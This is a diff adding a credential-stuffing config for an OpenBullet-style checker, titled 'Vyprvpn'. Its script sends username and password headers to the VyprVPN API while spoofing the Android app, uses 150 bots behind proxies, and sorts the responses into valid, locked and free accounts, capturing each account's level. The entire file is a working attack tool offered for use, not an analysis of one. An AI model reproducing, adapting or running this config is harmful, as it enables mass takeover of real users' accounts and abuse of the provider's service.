@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Vyprvpn",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-02T20:57:34.5347502+01:00",
+  "AdditionalInfo": "",
+  "Author": "Maamar",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+  HEADER "X-GF-Agent: VyprVPN Android v2.19.0.7702. (56aa5dfd)" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 2.19.0.7702" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 6.0" 
+  HEADER "User-Agent: okhttp\/2.3.0" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "account_level" 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+    KEY "locked" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "account_level\": \"Free\"" 
+#Account_Level PARSE "<SOURCE>" LR "account_level\": \"" "\", \"" -> CAP "Account Level" 
